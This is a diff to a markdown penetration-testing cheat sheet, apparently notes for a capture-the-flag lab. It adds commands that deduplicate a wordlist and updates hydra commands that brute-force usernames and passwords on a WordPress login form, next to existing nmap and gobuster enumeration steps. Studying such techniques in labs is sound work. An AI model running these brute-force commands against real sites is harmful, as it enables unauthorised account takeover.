@@ -8,12 +8,18 @@ nmap -sV -sC -oA initial $IP_ADDR
 WORDLISTS=
 gobuster dir -u HTTP://${IP_ADDR} -w ${WORDLISTS} -t 100 -q -o gobuster.txt
 ```
+## How to filter unique string
+```bash
+wc -l fsocity.dic # number of lines
+sort fsocity.dic | uniq | wc -l # unique words
+sort fsocity.dic | uniq > example_filtered.txt
+```
 ### How to bruteforce input fields with hydra
 Username
 ```bash
-hydra -L example.txt -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+hydra -L fsocity.dic -p example $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
 ```
 Password
 ```bash
-hydra -L example -P example.txt $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
+hydra -L example -P fsocity.dic $IP_ADDR http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you enter for the username" -t 30
 ```
